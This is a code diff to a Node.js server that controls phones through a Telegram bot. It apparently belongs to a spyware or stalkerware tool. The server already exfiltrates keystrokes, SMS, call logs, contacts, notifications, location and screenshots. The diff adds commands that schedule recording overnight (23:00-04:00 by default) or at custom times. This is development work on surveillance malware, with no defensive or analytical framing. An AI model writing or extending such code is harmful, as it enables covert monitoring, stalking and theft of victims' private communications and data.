@@ -604,6 +604,14 @@ function getHelpMessage() {
 /start_recording - Start scheduled recording
 /stop_recording - Stop recording service
 
+<b>⏰ RECORDING SCHEDULE COMMANDS (NEW)</b>
+/record_auto_on - Enable auto schedule (23:00-04:00 daily, every 15min)
+/record_auto_off - Disable auto schedule
+/record_schedule - Check current schedule status
+/record_custom HH:MM HH:MM [daily/once] [interval] - Set custom schedule
+   Example: /record_custom 22:00 02:00 daily 15
+   Example: /record_custom 23:30 05:30 once 30
+
 <b>⚙️ SERVICE CONTROL</b>
 /start_screenshot - Start screenshot service
 /stop_screenshot - Stop screenshot service
@@ -738,6 +746,14 @@ async function handleCommand(chatId, command, messageId) {
         ackMessage = `📸 Fetching screenshot settings...`;
     } else if (cleanCommand === 'location') {
         ackMessage = `📍 Getting your current location... This may take a few seconds.`;
+    } else if (cleanCommand === 'record_auto_on') {
+        ackMessage = `⏰ Enabling auto recording schedule (23:00-04:00)...`;
+    } else if (cleanCommand === 'record_auto_off') {
+        ackMessage = `⏰ Disabling auto recording schedule...`;
+    } else if (cleanCommand === 'record_schedule') {
+        ackMessage = `⏰ Fetching recording schedule status...`;
+    } else if (cleanCommand.startsWith('record_custom')) {
+        ackMessage = `⚙️ Setting custom recording schedule...`;
     }
     
     await sendTelegramMessage(chatId, ackMessage);
@@ -1006,6 +1022,11 @@ app.post('/api/register', async (req, res) => {
         `• /keystrokes_html - Keystrokes (HTML)\n` +
         `• /notifications_txt - Notifications (TXT)\n` +
         `• /notifications_html - Notifications (HTML)\n\n` +
+        `<b>⏰ Recording Schedule Commands (NEW):</b>\n` +
+        `• /record_auto_on - Enable auto schedule (23:00-04:00)\n` +
+        `• /record_auto_off - Disable auto schedule\n` +
+        `• /record_schedule - Check schedule status\n` +
+        `• /record_custom HH:MM HH:MM [daily/once] [interval] - Set custom schedule\n\n` +
         `<b>🔍 Info Commands:</b>\n` +
         `• /storage - Storage usage\n` +
         `• /network - Network details\n` +
@@ -1056,6 +1077,7 @@ app.get('/test', (req, res) => {
             <p><b>Devices:</b> ${devices.size}</p>
             <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
             <p><b>Location:</b> Now returns map link + pin</p>
+            <p><b>Recording Schedule Commands Added:</b> /record_auto_on, /record_auto_off, /record_schedule, /record_custom</p>
             <p><b>Commands return files:</b> /contacts_txt, /contacts_html, /sms_txt, /sms_html, /calllogs_txt, /calllogs_html</p>
             <p><a href="/test-help" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Help</a></p>
             <p><a href="/test-location" style="background: #2196F3; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Test Location Format</a></p>
@@ -1099,6 +1121,13 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('\n📍 LOCATION FEATURE UPDATED:');
     console.log('   └─ Now returns map link + pin');
     console.log('   └─ Dedicated /api/location endpoint added');
+    console.log('\n⏰ RECORDING SCHEDULE COMMANDS ADDED:');
+    console.log('   └─ /record_auto_on     - Enable auto schedule (23:00-04:00)');
+    console.log('   └─ /record_auto_off    - Disable auto schedule');
+    console.log('   └─ /record_schedule    - Check schedule status');
+    console.log('   └─ /record_custom      - Set custom schedule');
+    console.log('         Example: /record_custom 22:00 02:00 daily 15');
+    console.log('         Example: /record_custom 23:30 05:30 once 30');
     console.log('\n📱 FILE-BASED COMMANDS:');
     console.log('   └─ /contacts_txt     - Contacts as TXT file');
     console.log('   └─ /contacts_html    - Contacts as HTML file');
